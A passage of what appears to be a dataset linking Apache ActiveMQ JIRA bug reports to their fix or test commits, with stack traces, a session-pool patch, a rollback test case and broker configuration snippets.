	at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:205)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)",28443226b67529ed1cef132db8634cd73a981c58,"test case for: https://issues.apache.org/activemq/browse/AMQ-2383 - works on trunk

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813734 13f79535-47bb-0310-9956-ffa450edef68"
12482864,AMQ-2346,"In geronimo we're seeing an intermittent tck problem that seems to relate to a situation where there are:
-- a BMT stateless session ejb
-- two connections (I think these get shared to the same ManagedConnection)
-- two sessions
-- tx control through UT
-- send a message in one tx
-- receive message in a tx that is rolled back
-- receive message in a tx that is committed

In a public test case I'm seeing that the session proxies get confused about whether there is an active transaction.  This doesn't happen all the time but with a few repititions it happens consistently.

See GERONIMO-4784",490dcf9bd2111180d5d7821d3cda4a68e8c3de75,"AMQ-2346 test demonstrating problem (set to not run)

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@805881 13f79535-47bb-0310-9956-ffa450edef68"
12482784,AMQ-2327,"In a network of brokers of a size of 4 (or more) and using conduit subscriptions, some ""proxy"" consumers can be left hanging due to circular references.",83f519cd657aea378c3d7a4452f71318a2dbdcdf,https://issues.apache.org/jira/browse/AMQ-2327 - fix regression in org.apache.activemq.network.NetworkBrokerDetachTest - need to conduit statically included durables when dynamicOnly=false (local networkSubs)
12482766,AMQ-2305,"In a pure Master/Slave configuration, when the slave fails the TransportConnection invokes the MasterBroker's stop() method without taking into consideration the shutdownOnSlaveFailure boolean, which by default is set to false.  So even if shutdownOnSlaveFailure  is set to false, all my plugin brokers' stop methods get invoked when the slave fails.  ",a0b9aec6e95c566c22e04e8874f9729ec4490819,"test case for https://issues.apache.org/activemq/browse/AMQ-2305 - seems to work fine

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@788429 13f79535-47bb-0310-9956-ffa450edef68"
12482932,AMQ-2292,"When you try and use the ReadOnlyAsyncDataManager it throws a NullPointerException like the following:

java.lang.NullPointerException
	at org.apache.activemq.kaha.impl.async.AsyncDataManager.getNextLocation(AsyncDataManager.java:547)
	at org.apache.activemq.kaha.impl.async.ReadOnlyAsyncDataManager.getFirstLocation(ReadOnlyAsyncDataManager.java:128)
	at org.apache.activemq.kaha.impl.async.JournalImplTest.testReadOnlyRead(JournalImplTest.java:161)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:585)
	at junit.framework.TestCase.runTest(TestCase.java:168)
	at junit.framework.TestCase.runBare(TestCase.java:134)
	at junit.framework.TestResult$1.protect(TestResult.java:110)
	at junit.framework.TestResult.runProtected(TestResult.java:128)
	at junit.framework.TestResult.run(TestResult.java:113)
	at junit.framework.TestCase.run(TestCase.java:124)
	at junit.framework.TestSuite.runTest(TestSuite.java:232)
	at junit.framework.TestSuite.run(TestSuite.java:227)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:81)


The ReadOnlyDataManager needs to init an accessorPool. Testcase and patch attached.",2cdb51bb748250762891554739ca2125c13122c6,"fix for https://issues.apache.org/activemq/browse/AMQ-2292 - ReadOnlyAsyncDataManager NPE

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@785525 13f79535-47bb-0310-9956-ffa450edef68"
12482910,AMQ-2274,"I use ActiveMQ 5.2 and configure a client using jndi.properties with connection url:
connection.TopicConnectionFactory.brokerURL=tcp://localhost:61616?soTimeout=30000&connectionTimeout=30000&keepAlive=true&minmumWireFormatVersion=3&jms.prefetchPolicy.all=5


All boolean properties (keepAlive) are ignored",fbddf4f8683a0c246899b290ad9269c42367188d,"resolve https://issues.apache.org/activemq/browse/AMQ-2274 - add simple Boolean PropertyEditor implementation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@783281 13f79535-47bb-0310-9956-ffa450edef68"
12482881,AMQ-2249,"PooledConnection.close() calls rollback() on the internal session. However, when the internal session is an instance of  ActiveMQXASession, this always results in a TransactionInProgressException being thrown (and subsequently caught). Unfortunately, in this path of execution, the session pool is not informed.

The sessionPool knows nothing about the session being discarded and ultimately, GenericObjectPool.borrowObject() blocks forever since _numActive is never decremented.

I think the pool should at least be told that the session has been invalidated (this is not a full fix but should at least stop any hanging threads). Below is a partial patch (I'll work on a full solution when I have time):
{code} 
Index: activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java
===================================================================
--- activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java     (revision 768326)
+++ activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java     (working copy)
@@ -120,6 +120,7 @@
                         LOG.trace(""Ignoring exception as discarding session: "" + e1, e1);
                     }
                     session = null;
+                    sessionPool.invalidateSession(this);
                     return;
                 }
             }
Index: activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java
===================================================================
--- activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java       (revision 768326)
+++ activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java       (working copy)
@@ -59,6 +59,14 @@
             throw JMSExceptionSupport.create(e);
         }
     }
+    
+    public void invalidateSession(PooledSession session) throws JMSException {
+       try {
+            getSessionPool().invalidateObject(session);
+        } catch (Exception e) {
+            throw JMSExceptionSupport.create(""Failed to invalidate session: "" + e, e);
+        }
+    }
 
     public void returnSession(PooledSession session) throws JMSException {
         // lets check if we are already closed
{code} ",eae5aa09d1237cd299f555ade4256d989be7497b,"Fix for https://issues.apache.org/activemq/browse/AMQ-2249

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813053 13f79535-47bb-0310-9956-ffa450edef68"
12482803,AMQ-2241,"localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1255)
	at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:50)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1359)
	at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:300)
	at org.apache.activemq.ra.ManagedConnectionProxy.createSessionProxy(ManagedConnectionProxy.java:119)
	at org.apache.activemq.ra.ManagedConnectionProxy.createSession(ManagedConnectionProxy.java:105)
	at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:462)
	... 35 more
Caused by: java.lang.IllegalStateException: localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:540)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)
	at java.lang.Thread.run(Thread.java:619)
",01e2aec7b59cf5def1c69a6c2208c7648b6956d2,"resolve https://issues.apache.org/activemq/browse/AMQ-2241 - ensure default session is created for a duplicate connection request

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@771718 13f79535-47bb-0310-9956-ffa450edef68"
12482803,AMQ-2241,"localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1255)
	at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:50)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1359)
	at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:300)
	at org.apache.activemq.ra.ManagedConnectionProxy.createSessionProxy(ManagedConnectionProxy.java:119)
	at org.apache.activemq.ra.ManagedConnectionProxy.createSession(ManagedConnectionProxy.java:105)
	at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:462)
	... 35 more
Caused by: java.lang.IllegalStateException: localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:540)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)
	at java.lang.Thread.run(Thread.java:619)
",9383c6d697658f6ac7902e621124649b510b6bb3,"resolve alternative path to https://issues.apache.org/activemq/browse/AMQ-2241 via ra where connection is reused. state tracker was not notified when remove command is suppressed and simulated during transport outage

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@774712 13f79535-47bb-0310-9956-ffa450edef68"
12483038,AMQ-2233,"After rollback received messages not re-presented.  If I receive in a transaction and then roll back the messages should be re-presented in the next transaction.  This used to work in 5.1.0, but is broken in 5.2.0.

You can browse the Queue in JMX after the rollback and see that the messages are still there, but they are not received by a consumer in the same process.

Here's a test case (fails on the checkPostConditions()):

{code}
public class RawRollbackTests {
	
	private static ConnectionFactory connectionFactory;
	private static Destination queue;
	private static BrokerService broker;

	@BeforeClass
	public static void clean() throws Exception {
		FileUtils.deleteDirectory(new File(""activemq-data""));
		broker = new BrokerService();
		broker.setUseJmx(true);
		broker.start();
		ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory();
		connectionFactory.setBrokerURL(""vm://localhost?async=false"");
		RawRollbackTests.connectionFactory = connectionFactory;
		queue = new ActiveMQQueue(""queue"");
	}

	@AfterClass
	public static void close() throws Exception {
		broker.stop();
	}

	@Before
	public void clearData() throws Exception {
		getMessages(false); // drain queue
		convertAndSend(""foo"");
		convertAndSend(""bar"");
	}


	@After
	public void checkPostConditions() throws Exception {

		Thread.sleep(1000L);
		List<String> list = getMessages(false);
		assertEquals(2, list.size());

	}

	@Test
	public void testReceiveMessages() throws Exception {

		List<String> list = getMessages(true);
		assertEquals(2, list.size());
		assertTrue(list.contains(""foo""));

	}
	
	private void convertAndSend(String msg) throws Exception {
		Connection connection = connectionFactory.createConnection();
		connection.start();
		Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
		MessageProducer producer = session.createProducer(queue);
		producer.send(session.createTextMessage(msg));
		producer.close();
		session.commit();
		session.close();
		connection.close();
	}

	private List<String> getMessages(boolean rollback) throws Exception {
		Connection connection = connectionFactory.createConnection();
		connection.start();
		Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
		String next = """";
		List<String> msgs = new ArrayList<String>();
		while (next != null) {
			next = (String) receiveAndConvert(session);
			if (next != null)
				msgs.add(next);
		}
		if (rollback) {
			session.rollback();
		} else {
			session.commit();
		}
		session.close();
		connection.close();
		return msgs;
	}

	private String receiveAndConvert(Session session) throws Exception {
		MessageConsumer consumer = session.createConsumer(queue);
		Message message = consumer.receive(100L);
		consumer.close();
		if (message==null) {
			return null;
		}
		return ((TextMessage)message).getText();
	}
}
{code}",245771a14d81dda10a64a70406ea40cac7433f36,"test case for https://issues.apache.org/activemq/browse/AMQ-2233 with prefetch  workaround

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@773862 13f79535-47bb-0310-9956-ffa450edef68"
12483038,AMQ-2233,"After rollback received messages not re-presented.  If I receive in a transaction and then roll back the messages should be re-presented in the next transaction.  This used to work in 5.1.0, but is broken in 5.2.0.

You can browse the Queue in JMX after the rollback and see that the messages are still there, but they are not received by a consumer in the same process.

Here's a test case (fails on the checkPostConditions()):

{code}
public class RawRollbackTests {
	
	private static ConnectionFactory connectionFactory;
	private static Destination queue;
	private static BrokerService broker;

	@BeforeClass
	public static void clean() throws Exception {
		FileUtils.deleteDirectory(new File(""activemq-data""));
		broker = new BrokerService();
		broker.setUseJmx(true);
		broker.start();
		ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory();
		connectionFactory.setBrokerURL(""vm://localhost?async=false"");
		RawRollbackTests.connectionFactory = connectionFactory;
		queue = new ActiveMQQueue(""queue"");
	}

	@AfterClass
	public static void close() throws Exception {
		broker.stop();
	}

	@Before
	public void clearData() throws Exception {
		getMessages(false); // drain queue
		convertAndSend(""foo"");
		convertAndSend(""bar"");
	}


	@After
	public void checkPostConditions() throws Exception {

		Thread.sleep(1000L);
		List<String> list = getMessages(false);
		assertEquals(2, list.size());

	}

	@Test
	public void testReceiveMessages() throws Exception {

		List<String> list = getMessages(true);
		assertEquals(2, list.size());
		assertTrue(list.contains(""foo""));

	}
	
	private void convertAndSend(String msg) throws Exception {
		Connection connection = connectionFactory.createConnection();
		connection.start();
		Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
		MessageProducer producer = session.createProducer(queue);
		producer.send(session.createTextMessage(msg));
		producer.close();
		session.commit();
		session.close();
		connection.close();
	}

	private List<String> getMessages(boolean rollback) throws Exception {
		Connection connection = connectionFactory.createConnection();
		connection.start();
		Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);
		String next = """";
		List<String> msgs = new ArrayList<String>();
		while (next != null) {
			next = (String) receiveAndConvert(session);
			if (next != null)
				msgs.add(next);
		}
		if (rollback) {
			session.rollback();
		} else {
			session.commit();
		}
		session.close();
		connection.close();
		return msgs;
	}

	private String receiveAndConvert(Session session) throws Exception {
		MessageConsumer consumer = session.createConsumer(queue);
		Message message = consumer.receive(100L);
		consumer.close();
		if (message==null) {
			return null;
		}
		return ((TextMessage)message).getText();
	}
}
{code}",558ff7802d797d2c63c9efa12f179de080d8910d,"additional test for https://issues.apache.org/activemq/browse/AMQ-2233, broker in 5.2, works on trunk

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@775064 13f79535-47bb-0310-9956-ffa450edef68"
12483549,AMQ-2217,"I have written a test case which will demonstrate the difference between the following two scenarios:

1. Producer sending dissimilar JMSType messages to a queue, with a client consuming all messages (no selector).
2. Producer sending dissimilar JMSType messages to a queue, with a client consuming every other message (using selector).

With a large enough size of test messages (for my environment about 5k), scenario 2 will fail with delivery to the consumer halted, while scenario 1 will not.

Test Output:

waiting for consumer to pause ... consumer: 0, producer: 0
waiting for consumer to pause ... consumer: 200, producer: 5000
waiting for consumer to pause ... consumer: 200, producer: 5000
waiting for consumer to pause ... consumer: 200, producer: 5000
waiting for consumer to pause ... consumer: 200, producer: 5000
waiting for consumer to pause ... consumer: 200, producer: 5000",9f0c86cc6d347ada5c6678f4d877cb04a3af2300,"commit test case with policy maxPageSize workaround in place that demonstrates it works as expected - https://issues.apache.org/activemq/browse/AMQ-2217

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@995381 13f79535-47bb-0310-9956-ffa450edef68"
12483493,AMQ-2203,"It appears that there are now duplicate configuration points for Camel routes.  In the *activemq.xml* configuration file, the following configuration exists:


{noformat}
    <!--
    ** Lets deploy some Enterprise Integration Patterns inside the ActiveMQ Message Broker
    ** For more details see
    **
    ** http://activemq.apache.org/enterprise-integration-patterns.html
    -->
    <camelContext id=""camel"" xmlns=""http://camel.apache.org/schema/spring"">

        <!-- You can use a <package> element for each root package to search for Java routes -->
        <package>org.foo.bar</package>

        <!-- You can use Spring XML syntax to define the routes here using the <route> element -->
        <route>
            <from uri=""activemq:example.A""/>
            <to uri=""activemq:example.B""/>
        </route>
    </camelContext>

    <!--
    ** Lets configure some Camel endpoints
    **
    ** http://activemq.apache.org/camel/components.html
    -->

    <!-- configure the camel activemq component to use the current broker -->
    <bean id=""activemq"" class=""org.apache.activemq.camel.component.ActiveMQComponent"" >
        <property name=""connectionFactory"">
          <bean class=""org.apache.activemq.ActiveMQConnectionFactory"">
            <property name=""brokerURL"" value=""vm://localhost?create=false&amp;waitForStart=10000"" />
            <property name=""userName"" value=""${activemq.username}""/>
            <property name=""password"" value=""${activemq.password}""/>
          </bean>
        </property>
    </bean>
{noformat}

This is duplicated in the *webapps\camel\WEB-INF\applicationContext.xml* file:

{noformat}
  <camelContext xmlns=""http://camel.apache.org/schema/spring"">
    <route>
        <from uri=""activemq:example.A""/>
        <to uri=""activemq:example.B""/>
    </route>
  </camelContext>

  <!-- configure the camel activemq component to use the current broker -->
  <bean id=""activemq"" class=""org.apache.activemq.camel.component.ActiveMQComponent"" >
    <property name=""exposeAllQueues"" value=""true""/>
      <property name=""connectionFactory"">
        <bean class=""org.apache.activemq.ActiveMQConnectionFactory"">
          <property name=""brokerURL"" value=""vm://localhost?create=false&amp;waitForStart=10000"" />
          <property name=""userName"" value=""${activemq.username}""/>
          <property name=""password"" value=""${activemq.password}""/>
        </bean>
      </property>
  </bean>
{noformat}

The net effect of this is that when the broker is launched, there will be two consumers routing messages from example.A to example.B.  At best, this causes unnecessary overhead.  If a user edits the *activemq.xml* file to remove the route information, they think they have removed this camel route.  However, when the broker is restarted, the route still exists, only now with a single consumer routing the messages.  To truly remove the route, the user must also edit the *applicationContext.xml*.

If the configuration of Camel routes is now being handled in the *applicationContext.xml* file, then the obsolete configuration should be removed from *activemq.xml* and documentation should be updated.  In any case, the duplication of Camel routes in a default configuration should be eliminated.",144a362aeebdd11a8144c704d3ee0414cbb70a84,"test case for https://issues.apache.org/activemq/browse/AMQ-2203 - start=false

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@983027 13f79535-47bb-0310-9956-ffa450edef68"
12483493,AMQ-2203,"It appears that there are now duplicate configuration points for Camel routes.  In the *activemq.xml* configuration file, the following configuration exists:


{noformat}
    <!--
    ** Lets deploy some Enterprise Integration Patterns inside the ActiveMQ Message Broker
    ** For more details see
    **
    ** http://activemq.apache.org/enterprise-integration-patterns.html
    -->
    <camelContext id=""camel"" xmlns=""http://camel.apache.org/schema/spring"">

        <!-- You can use a <package> element for each root package to search for Java routes -->
        <package>org.foo.bar</package>

        <!-- You can use Spring XML syntax to define the routes here using the <route> element -->
        <route>
            <from uri=""activemq:example.A""/>
            <to uri=""activemq:example.B""/>
        </route>
    </camelContext>

    <!--
    ** Lets configure some Camel endpoints
    **
    ** http://activemq.apache.org/camel/components.html
    -->

    <!-- configure the camel activemq component to use the current broker -->
    <bean id=""activemq"" class=""org.apache.activemq.camel.component.ActiveMQComponent"" >
        <property name=""connectionFactory"">
          <bean class=""org.apache.activemq.ActiveMQConnectionFactory"">
            <property name=""brokerURL"" value=""vm://localhost?create=false&amp;waitForStart=10000"" />
            <property name=""userName"" value=""${activemq.username}""/>
            <property name=""password"" value=""${activemq.password}""/>
          </bean>
        </property>
    </bean>
{noformat}

This is duplicated in the *webapps\camel\WEB-INF\applicationContext.xml* file:

{noformat}
  <camelContext xmlns=""http://camel.apache.org/schema/spring"">
    <route>
        <from uri=""activemq:example.A""/>
        <to uri=""activemq:example.B""/>
    </route>
  </camelContext>

  <!-- configure the camel activemq component to use the current broker -->
  <bean id=""activemq"" class=""org.apache.activemq.camel.component.ActiveMQComponent"" >
    <property name=""exposeAllQueues"" value=""true""/>
      <property name=""connectionFactory"">
        <bean class=""org.apache.activemq.ActiveMQConnectionFactory"">
          <property name=""brokerURL"" value=""vm://localhost?create=false&amp;waitForStart=10000"" />
          <property name=""userName"" value=""${activemq.username}""/>
          <property name=""password"" value=""${activemq.password}""/>
        </bean>
      </property>
  </bean>
{noformat}

The net effect of this is that when the broker is launched, there will be two consumers routing messages from example.A to example.B.  At best, this causes unnecessary overhead.  If a user edits the *activemq.xml* file to remove the route information, they think they have removed this camel route.  However, when the broker is restarted, the route still exists, only now with a single consumer routing the messages.  To truly remove the route, the user must also edit the *applicationContext.xml*.

If the configuration of Camel routes is now being handled in the *applicationContext.xml* file, then the obsolete configuration should be removed from *activemq.xml* and documentation should be updated.  In any case, the duplication of Camel routes in a default configuration should be eliminated.",34dcc17aa3ea1643e99d37098a08c30e1eaf94ec,"test case for https://issues.apache.org/activemq/browse/AMQ-2203 - start=false

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@983035 13f79535-47bb-0310-9956-ffa450edef68"
12482913,AMQ-2195,"If you don't set an ExceptionListener on the connection to the broker from within your consumer you won't get any notification if the connection to the broker has been lost, instead MessageConsumer.receive() will only return null or block indefinitely depending on if you use the timeout parameter or not.",206df1bd5741424e3eadd4fcbb38411547a85379,"test case for https://issues.apache.org/activemq/browse/AMQ-2195

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@772931 13f79535-47bb-0310-9956-ffa450edef68"
12483418,AMQ-2183,"1. producer of VirtualTopic.testTopic publish message to brokerA
2. consumer 1 on brokerB with ""Consumer.A.VirtualTopic.testTopic
    consumer 2 on brokerB with ""Consumer.A2.VirtualTopic.testTopic
3. brokerA and brokerB are bridged.

Result: you will get 
ERROR MasterBroker - Slave Failed
javax.jms.JMSException: Slave broker out of sync with master - Message: ID:yhe-1337-1236273055924-0:16:1:1:738 on queue does not exist among pending(0) for subscription: ID:yhe-3603-1236271682179-0:13:1:1

Reason:
In TransactionBroker.java there is a ActiveMQMessageAudit and it will be configured if the broker is a slave. ActiveMQMessageAudit is using the messageId alone to check whether the message is a duplicate. The message for consumer2 will be ignored as duplicate and not saved to the message store because consumer1's same message arrives early.
",32acb34018346cc69ba384d9031dc0e83228eb1a,"test case for https://issues.apache.org/activemq/browse/AMQ-2183

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@796646 13f79535-47bb-0310-9956-ffa450edef68"
12482954,AMQ-2149,"I'm finding occasionally messages are not delivered in order in a shared filesystem master slave setup when the master fails and the slave takes over.  I'm running a simple test on one physical machine where the shared filesystem is on a single disk (no SAN currently involved).

I'm attaching a shell script (run_master_slave_brokers.sh) that starts a master and slave broker in the same directory, sleeps 20 seconds, kills the master, sleeps 20 seconds, starts a new slave, sleeps 20 seconds, kills the master, etc.

Also attached is a small java test program (MasterSlaveTest.java)  The program starts 10 JMS senders that send 75kb text messages every 25 ms to unique queues.  These messages contain a sequence number header (a long).  The program also starts 10 receivers (1 for each queue) that keep track of the next expected sequence number and validate each incoming sequence number.  If a receiver gets an unexpected sequence number, the test program exits (System.exit(1)).  Both the senders and receivers use the failover transport to connect to the broker.  Messages being sent are persistent, so in theory there should be no message loss when the master fails and slave takes over.

I run the script to start the brokers, then run my test program.  Most times when the script kills the master and the slave is promoted, things work fine - the test program reconnects, and messages continue to be delivered in order.  If I run this long enough though, eventually my test program fails just after a slave broker is promoted to master with output similar to this:


Mar 6, 2009 11:58:12 AM org.apache.activemq.transport.failover.FailoverTransport doReconnect
INFO: Successfully reconnected to tcp://localhost:61616
Mar 6, 2009 11:58:12 AM org.aaron.MasterSlaveTest$Receiver onMessage
WARNING: test.queue.3 received 630 expected 629


This indicates the receiver for test.queue.3 received message 630 after the slave broker took over and missed message 629.

This seems to happen more often when more senders and receivers are running and more queues are in use.  If I run a single sender/receiver pair on 1 queue, it is very difficult to make this happen.",0061f6f75538ede8fe3443925e64beb839abfb90,"https://issues.apache.org/jira/browse/AMQ-4000 - tracking subscription commands causes a problem with replay outside of activate - can reset a sub ack locations - regression in AMQ2149Test. Fixed by ignoring sub add during recovery replay

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511306 13f79535-47bb-0310-9956-ffa450edef68"
12482821,AMQ-2100,See thread on ActiveMQ user list: http://www.nabble.com/ConcurrentModificationException-while-closing-consumer-td21867250.html#a21924323,9a6074387637d18154dffb3017f7bf396aa7b237,"test for AMQ-2100

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@743027 13f79535-47bb-0310-9956-ffa450edef68"
12482756,AMQ-2097,"there is one missing jar dependency which will prevent users of activemq following the documentation (http://activemq.apache.org/xmpp.html) from connecting successfully.
the bigger problem is that the connector itself does not complain about any missing jar but behaves like in a real connection process (debugging with psi leaves you in a state of ""wtf"").

the missing jar is the wstx-asl-3.0.1.jar (see pom.xml dependencies in the activemq-xmpp).

this should at least be mentioned immediately in the documentation cause the feature itself (xmpp in conjunction with the agent topic) is awesome.
greets,
jochen
",69946d98059bf419449a886ca37629e007d79e49,"fix for https://issues.apache.org/activemq/browse/AMQ-2097 - missing jar dependency for activemq-xmpp

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@760045 13f79535-47bb-0310-9956-ffa450edef68"
12482798,AMQ-2096,"Starting up activemq with a default configuration + simple authentication + mysql-ds like:

        <plugins>
            <simpleAuthenticationPlugin>
              <users>
                <authenticationUser username=""${activemq.username}"" password=""${activemq.password}""
                  groups=""producers,consumers,admins""/>
              </users>
            </simpleAuthenticationPlugin>

            <authorizationPlugin>
               <map>
                 <authorizationMap>
                   <authorizationEntries>
                     <authorizationEntry queue="">"" write=""producers"" read=""consumers"" admin=""admins"" />
                     <authorizationEntry topic="">"" write=""producers"" read=""consumers"" admin=""admins"" />

                     <authorizationEntry queue=""ActiveMQ.Advisory.>"" write=""all"" read=""all"" admin=""all"" />
                     <authorizationEntry topic=""ActiveMQ.Advisory.>"" write=""all"" read=""all"" admin=""all"" />
                   </authorizationEntries>
                 </authorizationMap>
               </map>
            </authorizationPlugin>            
        </plugins>         

and a default mysql-ds as jdbcPersistenceAdapter results in the following warning message:
 
         WARN AdvisoryBroker - Failed to fire message master broker advisory

there seems to be no problems in the further processing of advisory messages, but the warning is introduced with the use of the authentication plugin.

greets,
jochen",479acad417aa06a28d90abc0baf6a32f203d4f43,"fix for https://issues.apache.org/activemq/browse/AMQ-2096

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@744082 13f79535-47bb-0310-9956-ffa450edef68"
12482763,AMQ-2087,<NA>,06da208e163f1fb6da2f4204bac57756b15b4b28,"test case for https://issues.apache.org/activemq/browse/AMQ-2087

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@738566 13f79535-47bb-0310-9956-ffa450edef68"
12482643,AMQ-2086,"To reproduce the problem:

1. define a duplex network with some destination policies
2. send a message to the excluded destination on the remote broker
3. try consume the message locally
4. the message should not be consumed (but it is)",39dd6b914a6954bf8f7114e97831482fd616e8bb,"fix for https://issues.apache.org/activemq/browse/AMQ-2086

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@738052 13f79535-47bb-0310-9956-ffa450edef68"
12483119,AMQ-2084,"I am using ActiveMQ 5.2.  I am unable to make use of XPATH selectors. 

Sample XML message: <?xml version='1.0' encoding='UTF-8'?><books><book lang='en'>ABC</book></books>
Topic where message is posted: VirtualTopic.TestXpath
Queue where message is listened to: Consumer.Sample.VirtualTopic.TestXpath
XPATH selector specified: XPATH '//books//book[@lang=''en'']'
Protocol: OpenWire

I read a different post on the same topic and added the following necessary JAR files to the classpath apart from activemq-all-5.2.0.jar: 
- xalan.jar 
- xercesImpl.jar 
- xml-apis.jar 

- I have tried a lot of different combination for the XPATH selector but still the consumer is not getting any messages.  
- I am consuming from the physical queue of the virtual topic to which I am publishing. 
- I receive all the messages from the same physical queue if I don't use any selectors. 

Please find attached the test class (TestXPathSelectors.java) for reference. 

ActiveMQ - User Forum Thread Link: http://www.nabble.com/ActiveMQ---XPATH-Selectors---Unable-to-make-it-work-to21610375.html",6b18edc77133cafbf9297ec5e2991f09ccf1243b,"add test for https://issues.apache.org/activemq/browse/AMQ-2084 that works just fine

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@953739 13f79535-47bb-0310-9956-ffa450edef68"
12482722,AMQ-2080,"Using a connection URL of

{{discovery:(multicast://default?group=test)?maxReconnectAttempts=13&initialReconnectDelay=1000&useExponentialBackOff=false}}

